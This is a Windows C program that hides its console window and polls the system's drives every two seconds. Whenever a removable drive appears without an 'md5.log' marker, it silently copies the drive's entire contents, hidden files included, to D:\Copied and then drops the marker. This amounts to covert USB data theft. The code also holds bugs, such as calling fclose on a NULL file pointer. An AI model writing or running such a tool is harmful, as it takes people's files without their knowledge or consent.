#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#define _WIN32_WINNT 0x0500

#include <windows.h>
#include <wchar.h>


char* hash_generator(int SIZE) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    const int charset_size = 62;

    char* hash;
    hash = malloc((SIZE+1) * sizeof(char));
    srand(time(0));
    for (int i=0; i<SIZE; i++) {

        char cur = charset[rand()%charset_size];
        //printf("%c", cur);
        hash[i] = cur;
    }
    hash[SIZE] = 0;
    return hash;
}


int exec() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_MINIMIZE);
    ShowWindow(hWnd, SW_HIDE);
    wchar_t LogicalDrives[MAX_PATH] = {0};
    DWORD r = GetLogicalDriveStringsW(MAX_PATH, LogicalDrives);

    if (r == 0) {
        wprintf(L"Failed to get drive names %ld", GetLastError());
        return 1;
    }

    if (r > 0 && r <= MAX_PATH) {
        
        wchar_t *SingleDrive = LogicalDrives;

        while(*SingleDrive) {
            int n = GetDriveTypeW(SingleDrive);
            printf("%S  ->%d \n",SingleDrive, n);

            if (n==2) {

                // Check if the file exists
                char filename[100] ;
                sprintf(filename, "%Smd5.log",SingleDrive);
                printf("Name =%s\n", filename);
                FILE *file;
                file = fopen(filename, "r");
                if (file == NULL) {
                    fclose(file);
                    
                    printf("File Not Found\nUncognized device!\nPreparing to Copy Files\n");
                    char command[100];
                    sprintf(command, "xcopy \"%S\\\" D:\\Copied\\ /s/h/e/k/f/c/Y ",SingleDrive );
                    system(command);
                    file = fopen(filename, "w");
                }
                else {    
                    printf("File Found\nDevice is Recognized!\n");
                    fclose(file);
                }
            }

            SingleDrive += wcslen(SingleDrive) + 1;
        }
    }
}

int main() {
    printf("%s\n", hash_generator(10));
    while(1){
        exec();
        Sleep(2000);

    }

    return 0;
}
